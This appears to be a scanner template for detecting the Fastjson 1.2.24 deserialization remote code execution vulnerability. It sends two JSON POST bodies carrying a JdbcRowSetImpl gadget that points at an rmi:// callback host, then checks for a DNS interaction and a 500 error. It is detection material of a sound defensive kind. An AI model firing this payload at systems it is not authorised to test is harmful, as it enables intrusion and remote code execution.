id: fastjson-1-2-24-rce
brief:
    title: Fastjson 1.2.24 - Remote Code Execution
    by: zh
    level: critical
    about: Fastjson 1.2.24 is susceptible to a deserialization remote code execution vulnerability.
    label:
        - fastjson
        - rce
        - deserialization
        - oast
        - vulhub
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/'
      head:
        Content-Type: application/json
      body: |-
        {
            "b":{
                "@type":"com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
                "autoCommit":true
            }
        }
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - Internal Server Error
            - "500"
          in: body
          need: all
    - verb: POST
      to:
        - '{{BaseURL}}/'
      head:
        Content-Type: application/json
      body: |-
        {
           "@type":"com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
           "autoCommit":true
        }
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - Internal Server Error
            - "500"
          in: body
          need: all
